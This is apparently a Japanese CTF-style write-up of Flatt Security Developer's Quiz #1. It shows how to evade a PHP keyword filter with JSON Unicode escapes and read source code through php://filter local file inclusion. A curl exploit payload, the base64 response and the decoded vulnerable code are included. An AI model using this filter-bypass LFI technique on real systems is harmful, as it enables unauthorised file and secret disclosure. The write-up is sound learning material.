---
title: "Flatt Security Developer's Quiz #1"
date: 2022-07-22T13:10:45+09:00
tags: ["web", "Flatt Security Developer's Quiz"]
draft: false
---

[![flatt-security-developers-quiz1](https://i.gyazo.com/3f4da2d9f6df90bca9650e3e6d4ce3a1.jpg)](https://gyazo.com/3f4da2d9f6df90bca9650e3e6d4ce3a1)
https://twitter.com/flatt_security/status/1529416984785752065

# 方針
jsonの仕様でUnicode文字列が展開されるので、それを使ってフィルタリングを回避します。
次に`php://filter/convert.base64-encode`を使ってLocal File Inclusion(LFI)をします。

## file_get_contents("php://input")
以下の`php://input`はリクエストのbodyから生のデータを読み込むことができ、
`file_get_contents()`はファイルの内容を文字列に読み込むます。

```php
$query = file_get_contents("php://input");
```
[![file_get_contents](https://i.gyazo.com/c7dc61cc00bcc5ba1028b1b42c18755b.png)](https://gyazo.com/c7dc61cc00bcc5ba1028b1b42c18755b)

## フィルタリングの回避方法の検討
次の`$filter_list`でフィルタリングされている文字列は、
[PHPのwrapper](https://www.php.net/manual/en/wrappers.php)というものに含まれています。
このフィルタをjsonのUnicode文字列を使って回避します。

また、以下のように[`stripos()`](https://www.php.net/manual/en/function.stripos.php)が使われているので、
大文字で回避することもできません。
> stripos — Find the position of the first occurrence of a case-insensitive substring in a string

```php
foreach ($filter_list as $filter) {
  if(stripos($query, $filter) !== false) {
    exit("Filtered!");
  }
}
```

## LFIの検討
次の`json_decode($query, true)['fn']`の部分は、
`{"fn": "hoge"}`のようなjson形式を求められています。
`"hoge"`の部分に`php://...`というPHPのsupported protocol/wrapperを与えて、
LFIするというのが、この問題の解法です。

```php
$output = file_get_contents(json_decode($query, true)['fn']);
```

また、LFIで読み込んだファイルに`<?php`という文字列があると終了してしまうので、
`php://filter/convert.base64-encode`を使ってbase64でエンコードした文字列を出力します。

## フィルタリングの回避とLFI
[Using php://filter for local file inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)を参考にして次のようなURLを考えます。

```none
php://filter/convert.base64-encode/resource=index.php
```

このURLにはフィルタリングされている文字が含まれるので、それをUnicode文字列に置き換えます。

```none
{"fn": "p\u0068p:\u002F\u002Ffi\u006Cter\u002Fconvert\u002Ebase64-encode\u002Fresource=index\u002Ep\u0068p"}
```

# 解答
```none
curl https://2205bison.twitter-quiz.flatt.training/ -d '{"fn": "p\u0068p:\u002F\u002Ffi\u006Cter\u002Fconvert\u002Ebase64-encode\u002Fresource=index\u002Ep\u0068p"}'
```

```none
{"data":"PD9waHAKCi8qIENhbiB5b3UgbGVhayB0aGUgc2VjcmV0PyAqLwplcnJvcl9yZXBvcnRpbmcoMCk7CmRlZmluZSgiU0VDUkVUIiwgIkdPT0RfSk9CX0ZJTkRJTkdfVEhFX1NFQ1JFVF9YT1hPIik7CgovKiBXQUYgKi8KJHF1ZXJ5ID0gZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CmlmKCEkcXVlcnkpewogIGV4aXQoIlBsZWFzZSBzZW5kIEpTT04gZGF0YS4uIik7Cn0KJGZpbHRlcl9saXN0ID0gWwogICJwaHAiLAogICJmaWwiLAogICJkYXQiLAogICJ6aXAiLAogICJwaGEiLAogICJleHAiLAogICIvIiwKICAiLiIsCl07CmZvcmVhY2ggKCRmaWx0ZXJfbGlzdCBhcyAkZmlsdGVyKSB7CiAgaWYoc3RyaXBvcygkcXVlcnksICRmaWx0ZXIpICE9PSBmYWxzZSkgewogICAgZXhpdCgiRmlsdGVyZWQhIik7CiAgfQp9CgovKiBSZWFkIGZpbGUgZnJvbSBKU09OICovCiRvdXRwdXQgPSBmaWxlX2dldF9jb250ZW50cyhqc29uX2RlY29kZSgkcXVlcnksIHRydWUpWydmbiddKTsKCi8qIEJsb2NrIHJlYWRpbmcgUEhQIGZpbGVzICovCmlmKHN0cmlwb3MoJG91dHB1dCwgIjw\/cGhwIikgIT09IGZhbHNlKXsKICBleGl0KCJGaWx0ZXJlZCEiKTsKfQoKZXhpdChqc29uX2VuY29kZShbImRhdGEiID0+ICRvdXRwdXRdKSk7Cgo\/Pgo="}
```

base64 decode
```php
<?php

/* Can you leak the secret? */
error_reporting(0);
define("SECRET", "GOOD_JOB_FINDING_THE_SECRET_XOXO");

/* WAF */
$query = file_get_contents("php://input");
if(!$query){
  exit("Please send JSON data..");
}
$filter_list = [
  "php",
  "fil",
  "dat",
  "zip",
  "pha",
  "exp",
  "/",
  ".",
];
foreach ($filter_list as $filter) {
  if(stripos($query, $filter) !== false) {
    exit("Filtered!");
  }
}

/* Read file from JSON */
$output = file_get_contents(json_decode($query, true)['fn']);

/* Block reading PHP files */
if(stripos($output, "<?php") !== false){
  exit("Filtered!");
}

exit(json_encode(["data" => $output]));

?>
```

`SECRET`の文字列は`GOOD_JOB_FINDING_THE_SECRET_XOXO`
